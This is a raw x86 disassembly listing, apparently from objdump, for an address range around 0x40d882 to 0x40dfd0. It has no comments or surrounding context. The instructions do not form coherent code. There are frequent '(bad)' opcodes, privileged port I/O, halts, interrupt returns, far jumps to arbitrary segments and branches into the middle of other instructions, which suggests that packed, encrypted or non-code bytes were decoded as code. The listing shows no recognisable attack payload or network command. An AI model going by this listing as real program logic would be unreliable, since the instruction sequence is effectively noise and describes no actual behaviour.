  40d882:	sbb    eax,0x5412d18
  40d887:	jmp    0xcd862124
  40d88c:	adc    al,0x2c
  40d88e:	jecxz  0x40d863
  40d890:	sub    BYTE PTR [ecx+0x5b],cl
  40d893:	into   
  40d894:	and    cl,BYTE PTR gs:[ecx+0x3e305189]
  40d89b:	or     eax,edi
  40d89d:	test   DWORD PTR [edx+ebp*8+0x6f54bd79],edx
  40d8a4:	pop    es
  40d8a5:	and    esp,DWORD PTR [esp+0x32]
  40d8a9:	ret    
  40d8aa:	adc    ah,dl
  40d8ac:	scas   eax,DWORD PTR es:[edi]
  40d8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ae:	out    dx,eax
  40d8af:	xchg   ebp,eax
  40d8b0:	mov    eax,0xf810084c
  40d8b5:	and    ah,cl
  40d8b7:	mov    bh,0xc8
  40d8b9:	stos   DWORD PTR es:[edi],eax
  40d8ba:	lods   al,BYTE PTR ds:[esi]
  40d8bb:	rcr    BYTE PTR [esi+0x28917f6f],cl
  40d8c1:	ficom  WORD PTR [ebx]
  40d8c3:	jmp    0x40d934
  40d8c5:	xchg   esi,eax
  40d8c6:	sar    ebp,cl
  40d8c8:	shl    DWORD PTR [ebx+0x25d32094],cl
  40d8ce:	rcl    DWORD PTR [edx+0x7f25244],0x4
  40d8d5:	and    eax,0x9c53af41
  40d8da:	stos   BYTE PTR es:[edi],al
  40d8db:	cmp    eax,0x63733e3f
  40d8e0:	cmp    cl,ah
  40d8e2:	iret   
  40d8e3:	mov    esi,0xf686800a
  40d8e8:	out    0xa3,al
  40d8ea:	mov    ecx,0xee1316c6
  40d8ef:	jmp    0x40d92a
  40d8f1:	inc    esp
  40d8f2:	pushf  
  40d8f3:	dec    edx
  40d8f4:	je     0x40d889
  40d8f6:	adc    DWORD PTR [esi],0x2e00a8c8
  40d8fc:	dec    esp
  40d8fd:	jb     0x40d93a
  40d8ff:	in     al,0x5a
  40d901:	mov    BYTE PTR [eax],al
  40d903:	jbe    0x40d92b
  40d905:	out    dx,al
  40d906:	cld    
  40d907:	jno    0x40d902
  40d909:	in     eax,dx
  40d90a:	data16 lahf 
  40d90c:	icebp  
  40d90d:	jno    0x40d91a
  40d90f:	add    eax,0xd29e1069
  40d914:	dec    ebp
  40d915:	pop    ds
  40d916:	jg     0x40d90c
  40d918:	push   ecx
  40d919:	xchg   esi,eax
  40d91a:	imul   bh
  40d91c:	out    0x7,eax
  40d91e:	jle    0x40d900
  40d920:	pop    es
  40d921:	dec    ecx
  40d922:	xchg   edx,eax
  40d923:	cwde   
  40d924:	jle    0x40d8d5
  40d926:	(bad)  
  40d927:	jmp    0xf1b1885f
  40d92c:	loop   0x40d973
  40d92e:	(bad)  
  40d92f:	(bad)  
  40d930:	pop    edx
  40d931:	pop    esp
  40d932:	pop    esi
  40d933:	imul   esi,DWORD PTR [ebx-0x1a345184],0xcdf5922b
  40d93d:	test   ch,dh
  40d93f:	dec    ebp
  40d940:	dec    ecx
  40d941:	scas   eax,DWORD PTR es:[edi]
  40d942:	push   edi
  40d943:	add    dh,BYTE PTR [ecx]
  40d945:	push   es
  40d946:	mov    dl,0x81
  40d948:	xchg   esp,eax
  40d949:	arpl   WORD PTR [edx-0x30],bp
  40d94c:	adc    ebp,DWORD PTR [ebx]
  40d94e:	leave  
  40d94f:	and    al,0xe2
  40d951:	push   esp
  40d952:	xor    ah,dh
  40d954:	sub    esi,edx
  40d956:	pop    esi
  40d957:	retf   
  40d958:	retf   0xf5f8
  40d95b:	xor    al,0x73
  40d95d:	mov    edi,0xea3a5454
  40d962:	sbb    dh,0x66
  40d965:	cli    
  40d966:	xchg   ecx,eax
  40d967:	push   es
  40d968:	addr16 das 
  40d96a:	jp     0x40d968
  40d96c:	in     al,0xff
  40d96e:	cmc    
  40d96f:	sbb    al,0x9f
  40d971:	sti    
  40d972:	ret    0xde71
  40d975:	repz mov fs,WORD PTR [ebx]
  40d978:	sbb    al,0xb9
  40d97a:	jnp    0x40d9ab
  40d97c:	xchg   ebp,eax
  40d97d:	retf   0x6b18
  40d980:	jmp    0x40d9bf
  40d982:	sahf   
  40d983:	jns    0x40d973
  40d985:	and    eax,0x1dbfe8fe
  40d98a:	in     eax,0x89
  40d98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d98d:	aaa    
  40d98e:	or     BYTE PTR [ebx+0x1bf92d69],dl
  40d994:	mov    ds,WORD PTR [edx-0x1f]
  40d997:	inc    edx
  40d998:	arpl   WORD PTR [edi-0x37f3ce10],ax
  40d99e:	rcr    edx,cl
  40d9a0:	push   ebx
  40d9a1:	jmp    0xd570:0x5a75884d
  40d9a8:	pushf  
  40d9a9:	and    al,0xa0
  40d9ab:	out    0x5b,al
  40d9ad:	sbb    ebp,DWORD PTR [eax-0x226aef9c]
  40d9b3:	outs   dx,DWORD PTR ds:[esi]
  40d9b4:	ins    BYTE PTR es:[edi],dx
  40d9b5:	add    ecx,esi
  40d9b7:	test   ebp,0xc7b0f8b8
  40d9bd:	(bad)  
  40d9bf:	and    DWORD PTR [edx],esp
  40d9c1:	retf   0x6e48
  40d9c4:	cmc    
  40d9c5:	jecxz  0x40d9e8
  40d9c7:	ins    BYTE PTR es:[edi],dx
  40d9c8:	retf   0x74ee
  40d9cb:	mov    ebx,0xd655c1d0
  40d9d0:	cmc    
  40d9d1:	call   0xdfb16dca
  40d9d6:	adc    ebp,eax
  40d9d8:	ror    BYTE PTR [esp+ebx*1+0x42],0x1c
  40d9dd:	dec    ebx
  40d9de:	mov    ds:0x52666630,al
  40d9e3:	loopne 0x40d9ee
  40d9e5:	adc    eax,0x433ea05b
  40d9ea:	push   esi
  40d9eb:	push   eax
  40d9ec:	cdq    
  40d9ed:	cli    
  40d9ee:	mov    ?,WORD PTR [ebx]
  40d9f0:	in     al,0x1
  40d9f2:	fsub   st,st(0)
  40d9f4:	iret   
  40d9f5:	xor    al,BYTE PTR [ebx]
  40d9f7:	jo     0x40d994
  40d9f9:	sub    cl,BYTE PTR [edi]
  40d9fb:	retw   0xd381
  40d9ff:	mov    ?,WORD PTR [edi-0x1d]
  40da02:	add    al,al
  40da04:	mov    al,ds:0xc3809485
  40da09:	xor    ah,al
  40da0b:	idiv   ebp
  40da0d:	imul   edi,DWORD PTR [edx+0x0],0xffffffcc
  40da11:	mul    BYTE PTR [edx]
  40da13:	js     0x40da74
  40da15:	les    edx,FWORD PTR [eax]
  40da17:	jbe    0x40d9ec
  40da19:	lods   al,BYTE PTR ds:[esi]
  40da1a:	int    0x41
  40da1c:	or     dl,bh
  40da1e:	mov    ebp,0xe8941a9e
  40da23:	shl    BYTE PTR [eax-0x58],cl
  40da26:	enter  0xcbc0,0x17
  40da2a:	das    
  40da2b:	jb     0x40da26
  40da2d:	loop   0x40da74
  40da2f:	cmp    al,0xdf
  40da31:	(bad)  
  40da32:	idiv   DWORD PTR [edx+ebp*4]
  40da35:	mov    ch,0x1a
  40da37:	jae    0x40da2c
  40da39:	repz mov esp,0x3443c1e1
  40da3f:	call   0xb2e5:0x2af56a0d
  40da46:	(bad)  
  40da47:	and    BYTE PTR [ecx+0x6b],ah
  40da4a:	mov    ebx,0xbecfb3cd
  40da4f:	ror    cl,0x93
  40da52:	retf   
  40da53:	sub    al,0x2f
  40da55:	lahf   
  40da56:	out    0xe5,eax
  40da58:	adc    edx,DWORD PTR [edi+0x39]
  40da5b:	jnp    0x40d9fe
  40da5d:	les    edx,FWORD PTR [esi-0x55]
  40da60:	inc    esi
  40da61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da62:	aas    
  40da63:	mov    DWORD PTR [ebx+esi*8-0x6d77d2f6],edx
  40da6a:	xchg   ebx,eax
  40da6b:	hlt    
  40da6c:	and    al,BYTE PTR [esi]
  40da6e:	sbb    DWORD PTR [ecx],edi
  40da70:	jg     0x40dacc
  40da72:	bound  esp,QWORD PTR [edi-0x10ac86b1]
  40da78:	ss shr ah,cl
  40da7b:	sub    BYTE PTR [esi-0x52],dh
  40da7e:	addr16 aad 0x1
  40da81:	ret    
  40da82:	add    al,0xb4
  40da84:	das    
  40da85:	dec    esi
  40da86:	aam    0xe9
  40da88:	or     eax,0x727d1e03
  40da8d:	fwait
  40da8e:	addr16 (bad) 
  40da90:	ds ret 
  40da92:	js     0x40da87
  40da94:	dec    ecx
  40da95:	push   0x35
  40da97:	(bad)  
  40da98:	pop    esi
  40da99:	outs   dx,DWORD PTR ds:[esi]
  40da9a:	enter  0x76e6,0x48
  40da9e:	jg     0x40daf0
  40daa0:	push   es
  40daa1:	xor    DWORD PTR [edi-0x1d976368],esp
  40daa7:	sbb    dl,BYTE PTR [ecx+esi*1]
  40daaa:	inc    esp
  40daab:	in     al,0x64
  40daad:	sub    BYTE PTR [edx-0xd5eff98],dh
  40dab3:	dec    BYTE PTR [ecx-0x7f]
  40dab6:	dec    esp
  40dab7:	add    al,0x49
  40dab9:	sub    al,0x90
  40dabb:	xor    esp,eax
  40dabd:	mov    DWORD PTR [edx+0x6860181d],ebx
  40dac3:	int3   
  40dac4:	xor    eax,0x99f679c6
  40dac9:	test   DWORD PTR [ecx],esp
  40dacb:	inc    edx
  40dacc:	addr16 lahf 
  40dace:	shl    ecx,1
  40dad0:	aad    0x3e
  40dad2:	xchg   ecx,eax
  40dad3:	(bad)  
  40dad5:	mov    ds:0xbf0b02d1,al
  40dada:	test   edx,edi
  40dadc:	test   BYTE PTR [ebx+edi*8+0x7c],0x76
  40dae1:	adc    esp,DWORD PTR [eax+0x63]
  40dae4:	adc    ah,dl
  40dae6:	(bad)  
  40dae7:	xchg   esp,eax
  40dae8:	mov    bh,0x15
  40daea:	mov    WORD PTR [edi],?
  40daec:	mov    DWORD PTR [ebx],edi
  40daee:	sbb    edx,DWORD PTR [eax+0x32]
  40daf1:	sbb    al,0xf4
  40daf3:	mov    ecx,0xaa31aee7
  40daf8:	adc    eax,0x5464cd9f
  40dafd:	and    eax,0x1b374505
  40db02:	sbb    ebx,DWORD PTR [ebx]
  40db04:	xchg   esi,eax
  40db05:	push   cs
  40db06:	jb     0x40daf5
  40db08:	adc    eax,0xdbc04d54
  40db0d:	fisubr DWORD PTR [esi+0x32]
  40db10:	and    edx,DWORD PTR [eax-0x47b4eccd]
  40db16:	(bad)  
  40db17:	or     al,0xe5
  40db19:	shl    BYTE PTR [ecx+0x47172742],cl
  40db1f:	in     eax,dx
  40db20:	dec    edx
  40db21:	cld    
  40db22:	popf   
  40db23:	and    al,0x3c
  40db25:	push   0x5cedee98
  40db2a:	push   esp
  40db2b:	sar    ebp,0xdb
  40db2e:	add    DWORD PTR [esi+0x15],ecx
  40db31:	dec    edx
  40db32:	jge    0x40daef
  40db34:	dec    ebp
  40db35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db36:	push   ecx
  40db37:	sbb    BYTE PTR [esi+0x36],0x25
  40db3b:	mov    bl,0xd5
  40db3d:	jge    0x40dad2
  40db3f:	cmp    BYTE PTR [esi],ah
  40db41:	shl    DWORD PTR [ecx+0x1b1b9b02],1
  40db47:	retf   0xeb82
  40db4a:	sti    
  40db4b:	xchg   esp,eax
  40db4c:	stos   DWORD PTR es:[edi],eax
  40db4d:	push   ebp
  40db4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db51:	imul   esi,DWORD PTR [esi],0x4d4e4c9b
  40db57:	icebp  
  40db58:	sub    eax,0xef30f2df
  40db5d:	std    
  40db5e:	mov    dh,0xf7
  40db60:	adc    al,BYTE PTR [esi+0x21]
  40db63:	popf   
  40db64:	dec    esi
  40db65:	mov    edx,DWORD PTR [ebx-0x59]
  40db68:	pop    esi
  40db69:	data16 stc 
  40db6b:	int3   
  40db6c:	pop    ecx
  40db6d:	dec    esi
  40db6e:	sahf   
  40db6f:	cmp    cl,bh
  40db71:	ror    edi,cl
  40db73:	ds (bad) 
  40db75:	repnz (bad) [eax-0xa7aa953]
  40db7c:	in     eax,dx
  40db7d:	or     edx,esp
  40db7f:	push   0x20e3782f
  40db84:	jmp    0x40dbb0
  40db86:	add    bh,0x4f
  40db89:	mov    al,0x4c
  40db8b:	and    DWORD PTR [ecx],ebx
  40db8d:	add    BYTE PTR [ecx],dl
  40db8f:	and    al,0x11
  40db91:	push   ss
  40db92:	sub    eax,0xa6f5cc38
  40db97:	call   0x9a21:0x1779c385
  40db9e:	or     DWORD PTR [eax],edi
  40dba0:	rcr    BYTE PTR [edx+0x54],cl
  40dba3:	nop
  40dba4:	jb     0x40db40
  40dba6:	out    dx,al
  40dba7:	mov    al,ds:0x53dfb749
  40dbac:	iret   
  40dbad:	inc    edx
  40dbae:	or     al,0x22
  40dbb0:	add    BYTE PTR [edi-0x560bf57c],bh
  40dbb6:	xchg   ebx,eax
  40dbb7:	sbb    eax,0xe8098632
  40dbbc:	gs retf 
  40dbbe:	add    al,0xcc
  40dbc0:	(bad)  
  40dbc1:	int3   
  40dbc2:	jnp    0x40dc3c
  40dbc4:	push   esi
  40dbc5:	add    eax,0x8c811248
  40dbca:	and    eax,0x85884889
  40dbcf:	xchg   edi,ebp
  40dbd1:	push   0x2a
  40dbd3:	add    ah,bh
  40dbd5:	cdq    
  40dbd6:	test   BYTE PTR [ebp+0x4f5cc2d0],dl
  40dbdc:	fistp  DWORD PTR [ebx-0x50]
  40dbdf:	test   al,0x20
  40dbe1:	mov    ebp,0xcf21a8d7
  40dbe6:	and    BYTE PTR [edx],cl
  40dbe8:	enter  0xc86,0x67
  40dbec:	(bad)  
  40dbed:	mov    edx,DWORD PTR [eax]
  40dbef:	ret    0xf171
  40dbf2:	inc    ebp
  40dbf3:	neg    BYTE PTR [edx]
  40dbf5:	or     cl,BYTE PTR [eax+0x4e096de4]
  40dbfb:	xlat   BYTE PTR ds:[ebx]
  40dbfc:	mov    ds:0x8e915d6c,al
  40dc01:	add    cl,BYTE PTR [edx+edx*4-0x78]
  40dc05:	test   eax,0x8c664a89
  40dc0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0b:	lahf   
  40dc0c:	and    DWORD PTR [ebx+0x37076c0a],ebx
  40dc12:	loopne 0x40dbd9
  40dc14:	(bad)  
  40dc15:	jg     0x40dc13
  40dc17:	jecxz  0x40dbd0
  40dc19:	rol    BYTE PTR [edx+0x54],cl
  40dc1c:	fsubr  DWORD PTR [esi+0x32]
  40dc1f:	pop    ds
  40dc20:	and    bl,0x53
  40dc23:	iret   
  40dc24:	sbb    BYTE PTR [ebx],dh
  40dc26:	mov    dl,0x1f
  40dc28:	ret    0x1c35
  40dc2b:	call   0x495c:0xfdbbcf97
  40dc32:	lahf   
  40dc33:	dec    edi
  40dc34:	and    bl,BYTE PTR [edx-0xc]
  40dc37:	or     al,0x79
  40dc39:	retf   
  40dc3a:	stos   BYTE PTR es:[edi],al
  40dc3b:	stos   DWORD PTR es:[edi],eax
  40dc3c:	dec    edx
  40dc3d:	mov    eax,0xfe5be5c7
  40dc42:	xor    esp,0xffffffba
  40dc45:	pop    ebp
  40dc46:	pop    ebp
  40dc47:	jne    0x40dcaf
  40dc49:	je     0x40dcaa
  40dc4b:	pop    esi
  40dc4c:	in     eax,0xb0
  40dc4e:	(bad)  
  40dc4f:	fsub   QWORD PTR [ecx+eiz*2]
  40dc52:	shr    bh,1
  40dc54:	jae    0x40dc47
  40dc56:	cld    
  40dc57:	jns    0x40dcae
  40dc59:	(bad)
  40dc5d:	xchg   ebp,eax
  40dc5e:	dec    edx
  40dc5f:	aam    0xea
  40dc61:	jne    0x40dc29
  40dc63:	daa    
  40dc64:	daa    
  40dc65:	cdq    
  40dc66:	sahf   
  40dc67:	sahf   
  40dc68:	data16 (bad) 
  40dc6a:	(bad)  
  40dc6b:	mov    ebx,0xdffbe6f9
  40dc70:	and    bh,0x9
  40dc73:	cmp    bl,ch
  40dc75:	imul   ebp,DWORD PTR ss:[ebx-0x69],0xffffffb9
  40dc7a:	js     0x40dc5d
  40dc7c:	add    ch,BYTE PTR [edi]
  40dc7e:	mov    edi,0xcf33ccb2
  40dc83:	sahf   
  40dc84:	in     al,0xe4
  40dc86:	jmp    0x662c47c1
  40dc8b:	ss mov dh,0xa7
  40dc8e:	fldcw  WORD PTR [edi+ecx*2+0x20]
  40dc92:	pop    es
  40dc93:	gs nop
  40dc95:	adc    eax,0xabc03528
  40dc9a:	sub    BYTE PTR [edi],0x40
  40dc9d:	or     al,0x41
  40dc9f:	xchg   BYTE PTR [eax-0x58],al
  40dca2:	sbb    BYTE PTR [ebx+0x755498c],al
  40dca8:	lods   eax,DWORD PTR ds:[esi]
  40dca9:	retf   
  40dcaa:	out    dx,eax
  40dcab:	xchg   BYTE PTR [ecx],bh
  40dcad:	pop    eax
  40dcae:	out    dx,eax
  40dcaf:	xor    BYTE PTR [ebx-0x76],0x9d
  40dcb3:	inc    ebp
  40dcb4:	test   al,0xf5
  40dcb6:	ins    DWORD PTR es:[edi],dx
  40dcb7:	test   BYTE PTR [edx+0x2a],al
  40dcba:	add    al,0x28
  40dcbc:	xlat   BYTE PTR ds:[ebx]
  40dcbd:	sahf   
  40dcbe:	imul   edx,eax,0xb
  40dcc1:	aam    0x1f
  40dcc3:	mov    cs,WORD PTR [edx]
  40dcc5:	popa   
  40dcc6:	outs   dx,DWORD PTR ds:[esi]
  40dcc7:	popf   
  40dcc8:	ret    0xa47c
  40dccb:	mov    dh,0x1
  40dccd:	in     al,0x1e
  40dccf:	leave  
  40dcd0:	adc    bh,BYTE PTR [edi+0x4812344c]
  40dcd6:	dec    eax
  40dcd7:	jl     0x40dc5a
  40dcd9:	mov    ch,dl
  40dcdb:	xor    edi,DWORD PTR [eax+0x76]
  40dcde:	test   DWORD PTR cs:[ecx-0x57e729a2],edi
  40dce5:	inc    edi
  40dce6:	or     BYTE PTR [esi],ch
  40dce8:	mov    bl,0xb1
  40dcea:	scas   al,BYTE PTR es:[edi]
  40dceb:	ret    
  40dcec:	dec    esp
  40dced:	add    al,0x66
  40dcef:	cs mov dh,0x5f
  40dcf2:	mov    edx,0x9ae7406e
  40dcf7:	cdq    
  40dcf8:	outs   dx,BYTE PTR ds:[esi]
  40dcf9:	retf   
  40dcfa:	mov    ds,WORD PTR [ebx]
  40dcfc:	xor    DWORD PTR [eax-0x6],0x62e32776
  40dd03:	sbb    bh,BYTE PTR [ebp+0x2303a669]
  40dd09:	pop    es
  40dd0a:	aam    0xaa
  40dd0c:	push   ds
  40dd0d:	ret    
  40dd0e:	popa   
  40dd0f:	pop    eax
  40dd10:	cmp    BYTE PTR [esi-0xd],cl
  40dd13:	jae    0x40dd71
  40dd15:	or     bl,dl
  40dd17:	ins    DWORD PTR es:[edi],dx
  40dd18:	lsl    eax,WORD PTR [esi-0x56ffbb65]
  40dd1f:	mov    ebx,0x47310b2f
  40dd24:	ins    DWORD PTR es:[edi],dx
  40dd25:	add    BYTE PTR [esi-0x3e],ch
  40dd28:	nop
  40dd29:	lods   al,BYTE PTR ds:[esi]
  40dd2a:	push   ds
  40dd2b:	call   0x5213df62
  40dd30:	jns    0x40dd07
  40dd32:	and    BYTE PTR [edi],ch
  40dd34:	in     eax,0x8b
  40dd36:	mov    WORD PTR [edi+0x46],?
  40dd39:	lahf   
  40dd3a:	retf   0xf470
  40dd3d:	pushf  
  40dd3e:	ficom  DWORD PTR [eax-0x14af0181]
  40dd44:	popa   
  40dd45:	imul   esp,DWORD PTR [ecx],0x797e1b93
  40dd4b:	in     eax,dx
  40dd4c:	jmp    0x1125e647
  40dd51:	aas    
  40dd52:	push   es
  40dd53:	andnps xmm4,xmm3
  40dd56:	jge    0x40ddcb
  40dd58:	jae    0x40dced
  40dd5a:	jae    0x40dd03
  40dd5c:	dec    edi
  40dd5d:	repz inc edx
  40dd5f:	mov    ecx,0xa254a94c
  40dd64:	push   edx
  40dd65:	lods   eax,DWORD PTR ds:[esi]
  40dd66:	xor    bh,BYTE PTR [esi]
  40dd68:	ds dec esi
  40dd6a:	lods   eax,DWORD PTR ds:[esi]
  40dd6b:	pop    esi
  40dd6c:	addr16 jb 0x40dde1
  40dd6f:	xor    DWORD PTR [edi-0x42],0x7bef30e3
  40dd76:	(bad)  
  40dd78:	lock cmp eax,0x65d870c9
  40dd7e:	jne    0x40dd2d
  40dd80:	(bad)
  40dd83:	sub    eax,0x9cfa3636
  40dd88:	ds mov ebx,0xbccfd3c9
  40dd8e:	ret    0xbb9
  40dd91:	pop    ebx
  40dd92:	ins    BYTE PTR es:[edi],dx
  40dd93:	mov    bh,0x7c
  40dd95:	scas   al,BYTE PTR es:[edi]
  40dd96:	outs   dx,BYTE PTR ds:[esi]
  40dd97:	dec    esp
  40dd98:	and    bl,al
  40dd9a:	sbb    eax,esi
  40dd9c:	sbb    esp,DWORD PTR [eax]
  40dd9e:	es and al,dh
  40dda1:	ror    DWORD PTR [ebx+0x208fac35],0xd1
  40dda8:	or     al,0x22
  40ddaa:	sbb    DWORD PTR [edx],ebp
  40ddac:	mov    ds:0x22ffb133,al
  40ddb1:	sti    
  40ddb2:	cmp    eax,0x4dc92d32
  40ddb7:	pop    ss
  40ddb8:	ss dec esp
  40ddba:	shr    dl,0xed
  40ddbd:	scas   al,BYTE PTR es:[edi]
  40ddbe:	mov    ah,0xb
  40ddc0:	mov    dl,0xb0
  40ddc2:	xlat   BYTE PTR ds:[ebx]
  40ddc3:	xor    cl,BYTE PTR [esi-0xb4342dc]
  40ddc9:	sub    al,0x4d
  40ddcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddcc:	fiadd  WORD PTR ds:0x84568157
  40ddd2:	and    BYTE PTR fs:[esi-0x5656648e],bh
  40ddd9:	mov    bl,0x71
  40dddb:	adc    ah,bl
  40dddd:	lds    ebp,FWORD PTR [eax]
  40dddf:	add    dh,ch
  40dde1:	dec    ebp
  40dde2:	adc    DWORD PTR ds:0xee9db78b,0xadb5e996
  40ddec:	jge    0x40ddae
  40ddee:	fcomp  QWORD PTR [edi-0x71]
  40ddf1:	adc    eax,0xb420c452
  40ddf6:	stc    
  40ddf7:	xor    eax,0x82a7afaf
  40ddfc:	dec    ecx
  40ddfd:	ja     0x40dd84
  40ddff:	mov    ecx,0x7333ed9e
  40de04:	cwde   
  40de05:	xor    al,0x47
  40de07:	addr16 lahf 
  40de09:	lds    ebp,FWORD PTR [edx+edi*1+0x53359aaa]
  40de10:	and    al,0x10
  40de12:	inc    esi
  40de13:	push   eax
  40de14:	scas   eax,DWORD PTR es:[edi]
  40de15:	dec    ecx
  40de16:	out    dx,al
  40de17:	cmp    dl,ah
  40de19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de1a:	fild   QWORD PTR [edi]
  40de1c:	scas   al,BYTE PTR es:[edi]
  40de1d:	add    eax,0x35f7c660
  40de22:	bound  eax,QWORD PTR [eax]
  40de24:	dec    esi
  40de25:	mov    ds,WORD PTR [esp+esi*2-0x19b225e5]
  40de2c:	add    al,0x34
  40de2e:	mov    edx,0x2af981bd
  40de33:	inc    ebp
  40de34:	xchg   ebp,eax
  40de35:	mov    dl,0x1
  40de37:	mov    BYTE PTR ds:0x613949ce,bl
  40de3d:	push   ds
  40de3e:	and    bl,BYTE PTR [ecx-0xd0f451a]
  40de44:	inc    esp
  40de45:	popf   
  40de46:	xlat   BYTE PTR ds:[ebx]
  40de47:	test   eax,0xc8aab0f2
  40de4c:	push   eax
  40de4d:	push   0x431188d4
  40de52:	int3   
  40de53:	pusha  
  40de54:	loopne 0x40de9e
  40de56:	xchg   BYTE PTR [ebx],bl
  40de58:	outs   dx,DWORD PTR ds:[esi]
  40de59:	add    cl,BYTE PTR [eax-0x2d0a671e]
  40de5f:	adc    eax,0xc42207ca
  40de64:	xor    BYTE PTR [eax],ah
  40de66:	mov    ecx,0x1a954d3a
  40de6b:	sahf   
  40de6c:	outs   dx,DWORD PTR ds:[esi]
  40de6d:	(bad)  
  40de6e:	xlat   BYTE PTR ds:[ebx]
  40de6f:	adc    eax,DWORD PTR [esi-0x50b0fcc6]
  40de75:	fisttp DWORD PTR [ebp-0x4d]
  40de78:	or     eax,0x9972a501
  40de7d:	push   edx
  40de7e:	adc    al,dl
  40de80:	sbb    al,0x1b
  40de82:	arpl   WORD PTR [esi+0x76],sp
  40de85:	xchg   esi,eax
  40de86:	pop    es
  40de87:	pop    esi
  40de88:	mov    bh,0x8f
  40de8a:	icebp  
  40de8b:	mov    DWORD PTR [ecx-0x16],esi
  40de8e:	mov    ch,0xa
  40de90:	and    DWORD PTR [ecx-0x61],0x4e
  40de94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de95:	lds    ebx,FWORD PTR [ecx-0x2c334cd]
  40de9b:	hlt    
  40de9c:	jno    0x40defc
  40de9e:	jl     0x40de91
  40dea0:	add    ch,BYTE PTR [edi]
  40dea2:	popf   
  40dea3:	fsub   st,st(6)
  40dea5:	in     al,dx
  40dea6:	add    eax,0x126d5958
  40deab:	jbe    0x40de53
  40dead:	rcr    DWORD PTR [edi+0x2fcc082],0x48
  40deb4:	dec    eax
  40deb5:	jp     0x40ded7
  40deb7:	pop    es
  40deb8:	adc    BYTE PTR [edi],cl
  40deba:	aam    0xb2
  40debc:	push   ebp
  40debd:	and    DWORD PTR [eax+ebx*8-0x55],ebx
  40dec1:	jg     0x40de4e
  40dec3:	and    al,BYTE PTR [esi]
  40dec5:	lea    edx,[edi-0x40]
  40dec8:	xor    dl,BYTE PTR [ecx+0x30cf0754]
  40dece:	adc    ebp,DWORD PTR [ecx+0x18e78791]
  40ded4:	adc    eax,0x5f404c33
  40ded9:	or     esp,DWORD PTR [ecx-0x2322a44a]
  40dedf:	mov    al,ds:0x13df052c
  40dee4:	cmp    eax,0x44f13fff
  40dee9:	push   0xffffffd0
  40deeb:	jae    0x40df00
  40deed:	js     0x40df55
  40deef:	adc    BYTE PTR [ebx+edi*2-0xe608b23],ah
  40def6:	sbb    ah,BYTE PTR [esp+ecx*1+0x80aa721]
  40defd:	xchg   DWORD PTR [eax+0x592efba5],ecx
  40df03:	out    0x20,al
  40df05:	xor    edx,edx
  40df07:	(bad)  
  40df09:	inc    edx
  40df0a:	iret   
  40df0b:	xor    ecx,eax
  40df0d:	xor    DWORD PTR [ebx-0x5be7f66c],esp
  40df13:	mov    ds:0x289c5a18,al
  40df18:	pop    ss
  40df19:	loopne 0x40df6f
  40df1b:	push   ebx
  40df1c:	mov    dl,0x6f
  40df1e:	outs   dx,DWORD PTR ds:[esi]
  40df1f:	xchg   ebx,eax
  40df20:	xor    dl,ch
  40df22:	out    dx,al
  40df23:	mov    BYTE PTR [eax],ch
  40df25:	dec    ebp
  40df26:	push   es
  40df27:	stos   BYTE PTR es:[edi],al
  40df28:	cld    
  40df29:	std    
  40df2a:	je     0x40df67
  40df2c:	ret    
  40df2d:	stos   DWORD PTR es:[edi],eax
  40df2e:	shr    BYTE PTR [esi-0x26],1
  40df31:	or     BYTE PTR [eax+0x5b36ffa6],bl
  40df37:	pop    ebp
  40df38:	inc    edx
  40df39:	iret   
  40df3a:	dec    edx
  40df3b:	pop    edi
  40df3c:	jecxz  0x40df4d
  40df3e:	ja     0x40dec9
  40df40:	mov    bh,0x8
  40df42:	add    eax,0xef9b04b8
  40df47:	les    edi,FWORD PTR [edx+edi*2-0x46738bb0]
  40df4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4f:	pop    ecx
  40df50:	into   
  40df51:	pop    ebx
  40df52:	pop    ebx
  40df53:	or     eax,0x68a3097a
  40df58:	neg    DWORD PTR [edx-0x4b]
  40df5b:	xchg   esp,eax
  40df5c:	or     BYTE PTR [edx+edi*1],bh
  40df5f:	mov    dl,0x45
  40df61:	mov    eax,0xf7932aff
  40df66:	push   esp
  40df67:	or     bl,bl
  40df69:	xchg   edx,eax
  40df6a:	mov    al,0x53
  40df6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6d:	fisubr DWORD PTR [esi+0x3928b1a5]
  40df73:	in     al,0x11
  40df75:	add    al,0x41
  40df77:	pop    edx
  40df78:	add    DWORD PTR [edi+0x3f],eax
  40df7b:	fcmovnbe st,st(6)
  40df7d:	out    0x26,al
  40df7f:	imul   ebp,DWORD PTR [ebx+0x6b],0xfffffff6
  40df83:	jns    0x40df2f
  40df85:	fisubr DWORD PTR [esi-0x3ecec6d0]
  40df8b:	rcl    dl,cl
  40df8d:	pop    ebp
  40df8e:	jl     0x40df83
  40df90:	aaa    
  40df91:	mov    edi,0xa2884801
  40df96:	add    DWORD PTR [ebx],ebp
  40df98:	xchg   edi,eax
  40df99:	das    
  40df9a:	repnz aam 0xd3
  40df9d:	(bad)  
  40df9e:	pop    eax
  40df9f:	pop    esi
  40dfa0:	mov    esi,0x9d2f8bcc
  40dfa5:	out    0xb9,al
  40dfa7:	pop    ss
  40dfa8:	sahf   
  40dfa9:	addr16 in eax,0x6a
  40dfac:	test   DWORD PTR [ebp+0x7b2426ed],ebp
  40dfb2:	rcr    BYTE PTR [ebx-0x1aa380fe],0xa2
  40dfb9:	sub    cl,BYTE PTR [ecx]
  40dfbb:	dec    ebp
  40dfbc:	cwde   
  40dfbd:	xchg   BYTE PTR [ecx],bl
  40dfbf:	je     0x40dfde
  40dfc1:	xchg   esp,eax
  40dfc2:	pusha  
  40dfc3:	bound  edx,QWORD PTR [edi]
  40dfc5:	adc    ch,ch
  40dfc7:	pop    esi
  40dfc8:	shl    DWORD PTR [eax+0x5e],cl
  40dfcb:	call   0x47d2643
  40dfd0:	cmp    edi,DWORD PTR [eax+0x2a]
